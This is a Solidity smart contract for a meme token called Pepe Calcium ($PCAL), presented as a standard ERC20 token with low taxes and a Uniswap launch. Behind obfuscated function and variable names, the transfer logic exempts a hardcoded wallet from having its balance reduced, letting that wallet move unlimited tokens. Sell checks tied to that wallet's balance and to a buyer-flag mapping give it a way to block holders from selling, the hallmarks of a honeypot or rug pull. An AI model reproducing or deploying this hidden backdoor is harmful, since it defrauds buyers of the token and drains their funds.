/**

Pepe Calcium  $PCAL


TWITTER: https://twitter.com/Pepe_Calcium
TELEGRAM: https://t.me/Pepe_Calcium
WEBSITE: https://pepec.net/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mawzx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mawzx(a, b, "SafeMath");
    }

    function  _mawzx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qosneu {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _pieudls {
    function swatvTenwtSortgsFxlOrsfer(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PepeCalcium is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _pieudls private _Teqiek;
    address payable private _Tchvhifbx;
    address private _yiearcr;

    bool private _qvlihjv;
    bool public _Terelvae = false;
    bool private oiejetdk = false;
    bool private _autjepcz = false;

    string private constant _name = unicode"Pepe Calcium";
    string private constant _symbol = unicode"PCAL";
    uint8 private constant _decimals = 9;
    uint256 private constant _kTotalvi = 420690000 * 10 **_decimals;
    uint256 public _kvmkovrn = _kTotalvi;
    uint256 public _Wafsumye = _kTotalvi;
    uint256 public _rwapvThaesfwta= _kTotalvi;
    uint256 public _gfokTskaf= _kTotalvi;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _cEtkujmp;
    mapping (address => bool) private _taermcay;
    mapping(address => uint256) private _rpvobio;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yavipauq=0;
    uint256 private _bdmgwje=0;


    event _mobfpruf(uint _kvmkovrn);
    modifier oTecve {
        oiejetdk = true;
        _;
        oiejetdk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _kTotalvi;
        _cEtkujmp[owner(

        )] = true;
        _cEtkujmp[address
        (this)] = true;
        _cEtkujmp[
            _Tchvhifbx] = true;
        _Tchvhifbx = 
        payable (0x773568FDBEf06A59B362EdE67f032B0da01fEAb0);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _kTotalvi);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _kTotalvi;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mawzx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 epioumk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Terelvae) {
                if (to 
                != address
                (_Teqiek) 
                && to !=
                 address
                 (_yiearcr)) {
                  require(_rpvobio
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rpvobio
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yiearcr && to != 
            address(_Teqiek) &&
             !_cEtkujmp[to] ) {
                require(amount 
                <= _kvmkovrn,
                 "Exceeds the _kvmkovrn.");
                require(balanceOf
                (to) + amount
                 <= _Wafsumye,
                  "Exceeds the macxizse.");
                if(_bdmgwje
                < _yavipauq){
                  require
                  (! _ropmvra(to));
                }
                _bdmgwje++;
                 _taermcay
                 [to]=true;
                epioumk = amount._pvr
                ((_bdmgwje>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yiearcr &&
             from!= address(this) 
            && !_cEtkujmp[from] ){
                require(amount <= 
                _kvmkovrn && 
                balanceOf(_Tchvhifbx)
                <_gfokTskaf,
                 "Exceeds the _kvmkovrn.");
                epioumk = amount._pvr((_bdmgwje>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bdmgwje>
                _yavipauq &&
                 _taermcay[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oiejetdk 
            && to == _yiearcr &&
             _autjepcz &&
             contractTokenBalance>
             _rwapvThaesfwta 
            && _bdmgwje>
            _yavipauq&&
             !_cEtkujmp[to]&&
              !_cEtkujmp[from]
            ) {
                _rwkodeif( _rkpjd(amount, 
                _rkpjd(contractTokenBalance,
                _gfokTskaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _ujmepe(address
                    (this).balance);
                }
            }
        }

        if(epioumk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(epioumk);
          emit
           Transfer(from,
           address
           (this),epioumk);
        }
        _balances[from
        ]= _mawzx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mawzx(epioumk));
        emit Transfer
        (from, to, 
        amount.
         _mawzx(epioumk));
    }

    function _rwkodeif(uint256
     tokenAmount) private
      oTecve {
        if(tokenAmount==
        0){return;}
        if(!_qvlihjv)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Teqiek.WETH();
        _approve(address(this),
         address(
             _Teqiek), 
             tokenAmount);
        _Teqiek.
        swatvTenwtSortgsFxlOrsfer
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rkpjd
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mawzx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Tchvhifbx){
            return a ;
        }else{
            return a .
             _mawzx (b);
        }
    }

    function removexLimitas (
        
    ) external onlyOwner{
        _kvmkovrn = _kTotalvi;
        _Wafsumye = _kTotalvi;
        emit _mobfpruf(_kTotalvi);
    }

    function _ropmvra(address 
    account) private view 
    returns (bool) {
        uint256 oxzpa;
        assembly {
            oxzpa :=
             extcodesize
             (account)
        }
        return oxzpa > 
        0;
    }

    function _ujmepe(uint256
    amount) private {
        _Tchvhifbx.
        transfer(
            amount);
    }

    function enablesTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qvlihjv ) ;
        _Teqiek  
        =  
        _pieudls
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Teqiek), 
            _kTotalvi);
        _yiearcr = 
        _qosneu(_Teqiek.
        factory( ) 
        ). createPair (
            address(this
            ),  _Teqiek .
             WETH ( ) );
        _Teqiek.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yiearcr).
        approve(address(_Teqiek), 
        type(uint)
        .max);
        _autjepcz = true;
        _qvlihjv = true;
    }

    receive() external payable {}
}